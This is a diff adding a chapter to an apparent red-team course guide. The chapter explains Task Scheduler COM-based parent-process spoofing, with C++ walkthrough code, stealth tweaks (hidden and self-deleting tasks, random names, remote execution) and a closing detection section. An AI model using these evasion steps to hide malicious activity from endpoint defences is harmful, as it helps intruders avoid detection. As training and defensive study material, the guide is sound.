@@ -1,4 +1,4 @@
-# Detailed Guide for Non-privileged User Vector (Non-admin)
+## Detailed Guide for Non-privileged User Vector (Non-admin)
 
 <details>
 <summary>01 - Process Unhooking - Introduction</summary>
@@ -3755,4 +3755,432 @@ compile.bat
 - MITRE ATT&CK: T1134 (Parent PID Spoofing)
 - EDR Bypass Research Papers
 - 
+</details>
+
+
+
+
+<details>
+<summary>11 - Changing Parents Scheduler</summary>
+
+[02.Non-admin/05.PPID-spoof/02.scheduler](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/05.PPID-spoof/02.scheduler)
+
+## Overview
+
+Task Scheduler PPID spoofing is a technique that leverages the Windows Task Scheduler COM interface to launch processes with a different parent process ID. This method breaks the traditional parent-child relationship visible to EDR systems by making spawned processes appear as children of the Task Scheduler service rather than the malicious process.
+
+## The Problem: Traditional Process Spawning Detection
+
+### Why Parent-Child Relationships Matter for EDR
+
+EDR systems heavily monitor process creation chains:
+
+**Common Detection Patterns:**
+```
+Malicious Process (e.g., implant.exe)
+└── Suspicious Child (e.g., powershell.exe, cmd.exe)
+    └── Malicious Activity
+```
+
+**Real-World Attack Detection:**
+```
+Excel.exe (malicious macro)
+└── PowerShell.exe (suspicious child)
+    └── Payload.exe (clearly malicious)
+```
+
+### Legitimate Use of Task Scheduler
+
+The Windows Task Scheduler service (`svchost.exe` hosting Schedule service) legitimately spawns processes for scheduled tasks, making it an ideal candidate for PPID spoofing.
+
+## Technical Implementation
+
+### Step 1: Understanding the COM Interface Approach
+
+Instead of using the detectable `schtasks.exe` command-line tool, we use the Task Scheduler COM interface programmatically:
+
+**Advantages of COM Interface:**
+- No command-line arguments for EDR to monitor
+- More granular control over task creation
+- Ability to set hidden flags
+- Programmatic error handling
+
+### Step 2: Code Implementation Walkthrough
+
+#### Compile and Run the Demonstration
+
+```batch
+cd 02.scheduler
+compile.bat
+implant.exe
+```
+
+<img width="1686" height="815" alt="image" src="https://github.com/user-attachments/assets/0b6210c2-e33f-411f-a91e-820a48120086" />
+
+#### Step 2.1: COM Library Initialization
+
+```cpp
+	// initialize COM library
+	hr = CoInitialize(NULL);
+
+	printf("COM initialized.\n"); getchar();
+
+	if (SUCCEEDED(hr)) {
+		// get Task Scheduler object
+		hr = CoCreateInstance(CLSID_CTaskScheduler,
+							   NULL,
+							   CLSCTX_INPROC_SERVER,
+							   IID_ITaskScheduler,
+							   (void **) &pITS);
+		if (FAILED(hr)) {
+			CoUninitialize();
+			return 1;
+		}
+	}
+```
+
+Let's hit `enter` and we see two additional libraries being loaded `kernel.appcore.dll` and `uxtheme.dll`:
+
+<img width="1589" height="681" alt="image" src="https://github.com/user-attachments/assets/355cf2a1-4895-4610-a260-3bb95ae0f474" />
+
+
+**What Happens During COM Initialization:**
+- Loads essential COM libraries
+- Sets up apartment threading model
+- Prepares the process for COM object creation
+
+#### Step 2.2: Creating Task Scheduler Object
+
+```cpp
+ITaskScheduler *pITS;
+
+// Get Task Scheduler object via COM
+hr = CoCreateInstance(CLSID_CTaskScheduler,    // Class ID for Task Scheduler
+                       NULL,
+                       CLSCTX_INPROC_SERVER,   // Run in same process
+                       IID_ITaskScheduler,     // Interface ID we want
+                       (void **) &pITS);       // Output pointer
+
+printf("Task Scheduler object is up.\n"); 
+getchar();
+```
+
+<img width="1593" height="681" alt="image" src="https://github.com/user-attachments/assets/7acb2ec9-7be1-4e78-96b3-ee507cacc01c" />
+
+
+**COM Object Creation Explained:**
+- `CLSID_CTaskScheduler`: Globally unique identifier for Task Scheduler class
+- `IID_ITaskScheduler`: Interface identifier for Task Scheduler functionality
+- Returns a pointer to the `ITaskScheduler` interface for method calls
+
+#### Step 2.3: Creating a New Task
+
+```cpp
+LPCWSTR pwszTaskName;
+ITask *pITask;
+IPersistFile *pIPersistFile;
+pwszTaskName = L"ExecME";
+
+// Create new task object
+hr = pITS->NewWorkItem(pwszTaskName,        // Name of task
+                     CLSID_CTask,           // Class identifier for task
+                     IID_ITask,             // Interface identifier for task  
+                     (IUnknown**) &pITask); // Output task object
+```
+
+<img width="1678" height="814" alt="image" src="https://github.com/user-attachments/assets/bcb64ab8-30df-4101-93ff-0b62e96b4194" />
+
+**Task Creation Parameters:**
+- Task name: "ExecME" (visible in Task Scheduler)
+- CLSID_CTask: Standard task class ID
+- IID_ITask: Task interface for method calls
+
+#### Step 2.4: Configuring Task Parameters
+
+```cpp
+// Set task parameters
+pITask->SetComment(L"C'mon! Notepad is legit!");
+pITask->SetApplicationName(L"C:\\Windows\\System32\\notepad.exe");
+pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
+pITask->SetParameters(L"c:\\rto\\boom.txt");
+pITask->SetAccountInformation(L"rto", NULL);
+```
+
+<img width="1678" height="822" alt="image" src="https://github.com/user-attachments/assets/a58cb7ac-41c4-4f10-a412-0d51ce6cbd18" />
+<img width="1678" height="198" alt="image" src="https://github.com/user-attachments/assets/ff65e9d3-d94a-4a35-ac93-9550816349cd" />
+
+<img width="1625" height="663" alt="image" src="https://github.com/user-attachments/assets/e439d830-8730-488d-bd79-b6870ff1e2a1" />
+
+
+**Configuration Methods:**
+- `SetComment`: Description visible in Task Scheduler
+- `SetApplicationName`: Executable to launch
+- `SetWorkingDirectory`: Working directory for the process
+- `SetParameters`: Command-line arguments
+- `SetAccountInformation`: User context (NULL = current user)
+
+#### Step 2.5: Setting Task Flags
+
+```cpp
+// Standard flag - run only if user is logged on
+pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
+
+// Alternative: Hidden flag makes .job file invisible in Explorer
+// pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | TASK_FLAG_HIDDEN);
+```
+
+**Available Flags:**
+- `TASK_FLAG_RUN_ONLY_IF_LOGGED_ON`: Security restriction
+- `TASK_FLAG_HIDDEN`: Hides .job file from normal directory listing
+- `TASK_FLAG_RUN_IF_CONNECTED_TO_INTERNET`: Connectivity requirement
+- `TASK_FLAG_START_ONLY_IF_IDLE`: CPU idle requirement
+
+#### Step 2.6: Saving Task to Disk
+
+```cpp
+// Get IPersistFile interface for saving
+hr = pITask->QueryInterface(IID_IPersistFile, (void **) &pIPersistFile);
+
+// Save task to C:\Windows\Tasks\ExecME.job
+hr = pIPersistFile->Save(NULL, TRUE);  // NULL = use current name, TRUE = remember
+pIPersistFile->Release();
+```
+
+**File Location:**
+- Tasks are saved to `C:\Windows\Tasks\` directory
+- File format: `.job` files (binary task definitions)
+- With `TASK_FLAG_HIDDEN`: Files are hidden from normal Explorer view
+
+<img width="1680" height="814" alt="image" src="https://github.com/user-attachments/assets/28608523-3c5a-4b7a-9389-c00143fc219f" />
+
+
+#### Step 2.7: Executing the Task
+
+```cpp
+// Run the task immediately
+hr = pITask->Run();
+
+printf("Task ran.\n");
+printf("Check C:\\Windows\\Tasks folder\n"); 
+getchar();
+```
+
+**Process Creation Result:**
+```
+Task Scheduler Service (svchost.exe, PID: 1104)
+└── notepad.exe (PID: 7492) - Child of svchost, not implant.exe
+```
+
+<img width="1226" height="768" alt="image" src="https://github.com/user-attachments/assets/1e36b754-7ec7-4ade-be9c-bd87458a1355" />
+
+
+#### Step 2.8: Cleanup
+
+```cpp
+// Remove the task file
+pITS->Delete(pwszTaskName);
+
+// Release COM objects
+pITS->Release();
+pITask->Release();
+
+// Uninitialize COM
+CoUninitialize();
+```
+
+<img width="1681" height="817" alt="image" src="https://github.com/user-attachments/assets/827c5fff-a5d1-40c8-ac79-7c8513d8edf8" />
+
+
+## Practical Demonstration
+
+### Step 3: Observing the Process Tree
+
+#### Before Task Scheduler Spoofing:
+```
+implant.exe (PID: 1000)
+└── notepad.exe (PID: 1001) - Direct child, easily detectable
+```
+
+#### After Task Scheduler Spoofing:
+```
+svchost.exe (Schedule service, PID: 500)
+└── notepad.exe (PID: 1001) - Appears as legitimate scheduled task
+
+implant.exe (PID: 1000) - No visible relationship to notepad
+```
+
+### Step 4: File System Artifacts
+
+#### Visible Task File (Without Hidden Flag):
+```
+C:\Windows\Tasks\ExecME.job
+- Visible in Windows Explorer
+- Can be examined by blue teams
+- Contains task configuration details
+```
+
+#### Hidden Task File (With TASK_FLAG_HIDDEN):
+```
+C:\Windows\Tasks\ExecME.job
+- Not visible in normal Windows Explorer
+- Requires `dir /ah` in command prompt
+- Still detectable by forensic tools
+```
+
+### Step 5: Debugger Analysis - COM Internals
+
+#### COM Object Creation in Debugger
+
+**Setting Breakpoint and Analyzing:**
+```cpp
+// Set breakpoint on CoCreateInstance call
+hr = CoCreateInstance(CLSID_CTaskScheduler, ...);
+```
+
+**Debugger Observations:**
+1. **COM Initialization**: Loads `ole32.dll` and `combase.dll`
+2. **Object Creation**: Returns pointer to vtable (virtual function table)
+3. **Method Calls**: Each interface method call goes through vtable pointers
+
+**VTable Structure Example:**
+```
+pITS object pointer
+├── vtable pointer
+    ├── [0] QueryInterface method
+    ├── [1] AddRef method  
+    ├── [2] Release method
+    ├── [3] NewWorkItem method  // +0x18 offset
+    └── ... other ITaskScheduler methods
+```
+
+#### Method Call Analysis
+
+**NewWorkItem Call:**
+```cpp
+// In debugger: pITS->NewWorkItem(...)
+// Translates to: call [rax+0x18] where rax points to vtable
+```
+
+**ITask Method Calls:**
+```cpp
+pITask->SetComment(L"Notepad is legit!");
+// Debugger: call [rax+0x90] - SetComment method
+
+pITask->SetApplicationName(L"notepad.exe");  
+// Debugger: call [rax+0x100] - SetApplicationName method
+
+pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
+// Debugger: call [rax+0x120] - SetWorkingDirectory method
+```
+
+## Advanced Techniques
+
+### Step 6: Stealth Enhancements
+
+#### Using Hidden Flag
+```cpp
+// Combine flags for maximum stealth
+pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | 
+                 TASK_FLAG_HIDDEN |
+                 TASK_FLAG_DELETE_WHEN_DONE);
+```
+
+<img width="1686" height="818" alt="image" src="https://github.com/user-attachments/assets/43ea7c5b-86bb-4f2f-bd29-344c581cd3ab" />
+
+
+#### Dynamic Task Naming
+```cpp
+// Generate random task names to avoid detection
+WCHAR taskName[64];
+swprintf(taskName, L"Task_%08X", GetTickCount());
+pwszTaskName = taskName;
+```
+
+#### Remote Target Execution
+```cpp
+// The same technique works for remote systems
+// Requires appropriate permissions and COM security
+hr = CoCreateInstance(CLSID_CTaskScheduler,
+                      NULL, 
+                      CLSCTX_REMOTE_SERVER,  // Remote server
+                      IID_ITaskScheduler,
+                      (void **) &pITS);
+```
+
+### Step 7: Error Handling and Reliability
+
+```cpp
+// Comprehensive error handling
+hr = pITask->Run();
+if (FAILED(hr)) {
+    if (hr == SCHED_S_TASK_READY) {
+        printf("Task is ready but not running\n");
+    } else if (hr == SCHED_S_TASK_RUNNING) {
+        printf("Task is already running\n");
+    } else {
+        printf("Failed to run task: 0x%x\n", hr);
+    }
+}
+```
+
+## Detection and Mitigation
+
+### EDR Detection Opportunities
+
+#### Behavioral Indicators
+- COM object creation for Task Scheduler from unusual processes
+- Rapid task creation and execution patterns
+- Tasks with suspicious names or parameters
+- Mismatch between task creator and typical system behavior
+
+#### Forensic Artifacts
+- .job files in C:\Windows\Tasks with suspicious content
+- Task Scheduler event logs (Event ID 106, 140, 141)
+- COM activation events in Windows logs
+
+### Defensive Strategies
+
+#### Monitoring COM Activation
+```cpp
+// EDRs can monitor CoCreateInstance calls for suspicious CLSIDs
+BOOL MonitorTaskSchedulerCreation(DWORD callerPid) {
+    // Check if calling process typically creates scheduled tasks
+    // Verify task parameters are legitimate
+    // Alert on rapid task creation-deletion cycles
+    return IsSuspiciousBehavior(callerPid);
+}
+```
+
+#### File System Monitoring
+- Monitor .job file creation in C:\Windows\Tasks
+- Alert on hidden task files
+- Analyze task parameters for suspicious executables
+
+## Building the Project
+
+### Prerequisites
+- Visual Studio 2019 or later
+- Windows SDK
+- Required headers: `mstask.h`, `ole2.h`, `objidl.h`
+
+### Compilation
+```batch
+cd 11.TaskSchedulerPPID
+compile.bat
+```
+
+### Required Libraries
+```cpp
+#pragma comment (lib, "ole32")
+#pragma comment (lib, "mstask")  // Task Scheduler COM interface
+```
+
+## References
+
+- Microsoft Docs: Task Scheduler COM Interface
+- Windows Internals, 7th Edition - COM Architecture
+- MITRE ATT&CK: T1053.005 (Scheduled Task)
+- MSDN: ITaskScheduler Interface Documentation
+
+
 </details>
